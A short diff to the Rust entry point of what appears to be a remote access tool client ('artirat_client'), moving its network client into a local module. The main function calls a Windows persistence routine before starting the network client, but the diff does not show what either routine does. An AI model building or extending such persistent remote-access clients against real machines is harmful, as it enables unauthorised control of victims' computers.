@@ -1,4 +1,5 @@
-use artirat_client::netclient;
+mod lib;
+//use artirat_client::netclient;
 use anyhow::Result;
 #[cfg(target_os = "windows")]
 mod persist;
@@ -11,6 +12,6 @@ const IS_DLL: bool = false;
 async fn main() -> Result<()> {
     #[cfg(target_os = "windows")]
     persist::persist(IS_DLL);
-    netclient().await;
+    lib::netclient().await;
     Ok(())
 }
